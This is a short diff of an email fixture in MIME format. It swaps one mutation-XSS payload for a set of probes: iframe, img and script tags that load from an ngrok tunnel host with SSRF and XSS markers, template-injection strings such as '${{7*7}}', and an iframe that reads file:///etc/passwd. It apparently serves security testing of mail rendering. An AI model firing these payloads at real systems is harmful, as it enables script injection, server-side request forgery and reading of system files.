@@ -8,6 +8,7 @@ Content-Type: multipart/alternative; boundary="000000000000fdae5f0589846810"
 --000000000000fdae5f0589846810
 Content-Type: text/plain; charset="UTF-8"
 
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<iframe src="https://6d5b0eea0146.ngrok.io/ssrf${{7*7}}{7*7}[[7*7]][7*7]"><iframe src="file:///etc/passwd"></iframe><img src="https://6d5b0eea0146.ngrok.io/ssrf${{7*7}}{7*7}[[7*7]][7*7]"><script src="https://6d5b0eea0146.ngrok.io/xss${{7*7}}{7*7}[[7*7]][7*7]"></script>
+${{7*7}}{7*7}[[7*7]][7*7]
 
 --000000000000fdae5f0589846810--
